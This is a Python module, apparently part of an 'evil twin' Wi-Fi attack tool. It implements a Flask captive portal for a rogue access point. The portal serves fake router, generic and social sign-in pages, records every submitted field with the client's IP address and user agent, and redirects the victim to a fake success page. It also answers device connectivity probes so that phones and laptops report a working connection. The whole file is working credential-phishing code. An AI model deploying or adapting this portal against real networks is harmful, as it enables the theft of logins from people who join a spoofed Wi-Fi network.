"""Captive portal (Flask).

Serves a fake login page to clients that join the rogue AP, captures the
submitted credentials into the local :class:`CredentialStore`, then redirects
to a benign "you're connected" page. Also answers the well-known captive-portal
probe URLs so devices report a successful connection.

Scenarios select which template/fields are shown. All captured data stays
local to the operator's machine.
"""

from __future__ import annotations

import json
import os
from typing import Dict, Optional

from flask import (
    Flask,
    request,
    redirect,
    url_for,
    render_template,
    Response,
)

from wifi_evil_twin.config import Config
from wifi_evil_twin.core.credentials import CredentialStore

# Scenario registry: name -> template + redirect target.
SCENARIOS: Dict[str, Dict[str, str]] = {
    "router": {
        "template": "login_router.html",
        "title": "Router Administration",
        "redirect": "/success",
    },
    "generic": {
        "template": "login_generic.html",
        "title": "Network Login",
        "redirect": "/success",
    },
    "social": {
        "template": "login_social.html",
        "title": "Account Sign-in",
        "redirect": "/success",
    },
}


def get_scenario(name: str) -> Dict[str, str]:
    if name not in SCENARIOS:
        raise KeyError(f"unknown scenario '{name}'; choose from {list(SCENARIOS)}")
    return SCENARIOS[name]


def create_app(cfg: Config, store: CredentialStore) -> Flask:
    """Build the Flask app for the given config and credential store."""
    templates_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "templates")
    static_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), "static")
    app = Flask(__name__, template_folder=templates_dir, static_folder=static_dir)
    app.config["WET_CFG"] = cfg
    app.config["WET_STORE"] = store

    @app.route("/")
    @app.route("/index.html")
    def index():
        scenario = get_scenario(cfg.scenario)
        return render_template(
            scenario["template"], title=scenario["title"], ssid=cfg.ssid
        )

    @app.route("/login", methods=["POST"])
    @app.route("/submit", methods=["POST"])
    def login():
        scenario = get_scenario(cfg.scenario)
        # Capture every submitted field generically.
        if request.is_json:
            data = request.get_json(silent=True) or {}
        else:
            data = request.form.to_dict()
        store: CredentialStore = app.config["WET_STORE"]
        store.add(
            scenario=cfg.scenario,
            client_ip=request.remote_addr or "unknown",
            ssid=cfg.ssid,
            fields=data,
            user_agent=request.user_agent.string or "",
            path=request.path,
        )
        return redirect(scenario["redirect"])

    @app.route("/success")
    def success():
        return render_template("success.html", ssid=cfg.ssid)

    # ---- captive-portal probe endpoints (so devices show "connected") ----
    @app.route("/generate_204")
    @app.route("/ncsi.txt")
    @app.route("/hotspot-detect.html")
    @app.route("/library/test/success.html")
    def captive_probe():
        if request.path == "/ncsi.txt":
            return Response("Microsoft NCSI", mimetype="text/plain")
        return Response(status=204)

    @app.route("/captive.json")
    def captive_json():
        return Response(
            json.dumps({"captive": False, "success": True}),
            mimetype="application/json",
        )

    return app


def run_portal(cfg: Config, store: CredentialStore, *, dry_run: bool = False) -> None:
    """Run the captive portal (blocking). Under dry_run it just logs."""
    app = create_app(cfg, store)
    if dry_run:
        print(
            f"[dry-run] captive portal would serve on "
            f"{cfg.portal_bind}:{cfg.portal_port} (scenario='{cfg.scenario}')"
        )
        return
    app.run(host=cfg.portal_bind, port=cfg.portal_port, threaded=True)
